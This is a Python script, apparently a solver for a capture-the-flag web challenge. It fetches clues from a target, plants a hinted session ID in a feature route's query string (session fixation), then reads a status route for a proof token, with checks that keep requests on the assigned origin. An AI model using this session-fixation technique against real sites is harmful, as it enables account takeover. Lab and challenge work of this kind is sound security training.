#!/usr/bin/env python3
"""Plant the clue-provided session ID and read the assigned status proof."""

from __future__ import annotations

import argparse
from http.cookiejar import CookieJar
import json
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import (
    HTTPRedirectHandler,
    Request,
    build_opener,
    HTTPCookieProcessor,
)

from inspect_target import normalize_url, origin


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")


class NoAutomaticRedirects(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        return None


def get_json(
    opener,
    url: str,
    allowed_origin: tuple[str, str, int],
) -> dict[str, object]:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin URL: {normalized}")
    request = Request(
        normalized,
        headers={
            "User-Agent": "HuntressCTF-Web-Inspector/1.0",
            "Accept": "application/json",
        },
        method="GET",
    )
    try:
        response = opener.open(request, timeout=10)
    except HTTPError as exc:
        if exc.code in {301, 302, 303, 307, 308}:
            raise RuntimeError(f"refusing redirect from {normalized}") from exc
        body = exc.read(4096).decode("utf-8", errors="replace")
        raise RuntimeError(f"GET {normalized} returned HTTP {exc.code}: {body}") from exc
    except URLError as exc:
        raise RuntimeError(f"request failed: {exc.reason}") from exc
    with response:
        body = response.read(2 * 1024 * 1024 + 1)
    value = json.loads(body.decode("utf-8"))
    if not isinstance(value, dict):
        raise ValueError(f"expected a JSON object from {normalized}")
    return value


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow the assigned session hint through the feature and status routes."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        cookie_jar = CookieJar()
        opener = build_opener(NoAutomaticRedirects, HTTPCookieProcessor(cookie_jar))
        clues_url = urljoin(target, "/api/clues")
        clues = get_json(opener, clues_url, allowed_origin)
        feature_route = clues.get("feature_route")
        status_route = clues.get("secondary_route")
        session_hint = clues.get("session_hint")
        if not all(
            isinstance(value, str) and value
            for value in (feature_route, status_route, session_hint)
        ):
            raise ValueError("route inventory lacks a feature, status route, or session hint")

        feature_url = normalize_url(urljoin(target, feature_route))
        status_url = normalize_url(urljoin(target, status_route))
        if origin(feature_url) != allowed_origin or origin(status_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")
        parts = urlsplit(feature_url)
        query = parse_qs(parts.query, keep_blank_values=True)
        query["sid"] = [session_hint]
        feature_url = urlunsplit(
            (
                parts.scheme,
                parts.netloc,
                parts.path,
                urlencode(query, doseq=True),
                "",
            )
        )

        planted = get_json(opener, feature_url, allowed_origin)
        if planted.get("session_established") is not True:
            raise ValueError(f"session route did not establish the hinted session: {planted!r}")
        status = get_json(opener, status_url, allowed_origin)
        proof = status.get("evidence")
        if status.get("effect") != "fixed_session_privilege_transfer":
            raise ValueError(f"status route did not report the expected effect: {status!r}")
        if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
            raise ValueError(f"status route did not return a proof: {status!r}")
        print(
            json.dumps(
                {
                    "proof": proof,
                    "effect": status["effect"],
                    "session_cookie_names": sorted(
                        {cookie.name for cookie in cookie_jar}
                    ),
                    "feature_url": feature_url,
                    "status_url": status_url,
                },
                indent=2,
            )
        )
        return 0
    except (ValueError, RuntimeError, OSError, UnicodeDecodeError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
